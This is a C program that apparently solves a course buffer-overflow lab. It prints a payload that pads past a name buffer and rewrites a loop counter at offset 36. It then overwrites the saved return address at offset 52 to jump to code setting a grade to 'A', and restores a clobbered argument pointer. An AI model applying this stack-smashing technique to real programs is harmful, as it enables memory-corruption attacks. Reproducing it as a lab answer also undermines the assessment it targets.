#include <stdio.h>
#include <string.h>

int main(void) {
    const char *name = "(Your Name)";

    //address of instruction in main
    const unsigned int GRADE_A_ADDR = 0x0804855c;

    //original address of buffer (argument s) restore this so the program doesn't crash
    const unsigned int NAME_BUFFER_ADDR = 0x0804a080;

    int i = 0;

    //write Name (0-5)
    for (int j = 0; name[j] != '\0'; j++) {
        putchar(name[j]);
        i++;
    }
    //keep output clean
    putchar(0x00); i++;

    //pad until we hit the variable i (offset 36)
    // The buffer is at ebp-0x30 (48). i is at ebp-0xc (12) distance = 36 bytes.
    while (i < 36) {
        putchar('X');
        i++;
    }

    /*
     * We are now writing to the memory location of the loop counter i.
     * write the current index value (36, 37, 38, 39) so the loop continues sequentially.
     */

    //offset 36: Write 0x24 (36). i stays 36. loop increments to 37.
    putchar(0x24); i++;

    //offset 37: i is 37. Byte 1 is 00.
    putchar(0x00); i++;

    //offset 38: i is 38. Byte 2 is 00.
    putchar(0x00); i++;

    //offset 39: i is 39. Byte 3 is 00.
    putchar(0x00); i++;

    //pad remaining distance to return (offset 52)
    while (i < 52) {
        putchar('B');
        i++;
    }

    //overwrite return address (Offset 52-55) jump to instruction that assigns grade = 'A'

    putchar((GRADE_A_ADDR) & 0xff);
    putchar((GRADE_A_ADDR >> 8) & 0xff);
    putchar((GRADE_A_ADDR >> 16) & 0xff);
    putchar((GRADE_A_ADDR >> 24) & 0xff);

    //update counter (i now 56)
    i += 4;

    //(offset 56-59)
    //since we overflowed past RET, we corrupted the function argument s
    //write original buffer address back so function can finish cleanup without segfaulting
    putchar((NAME_BUFFER_ADDR) & 0xff);
    putchar((NAME_BUFFER_ADDR >> 8) & 0xff);
    putchar((NAME_BUFFER_ADDR >> 16) & 0xff);
    putchar((NAME_BUFFER_ADDR >> 24) & 0xff);

    putchar('\n');

    return 0;
}
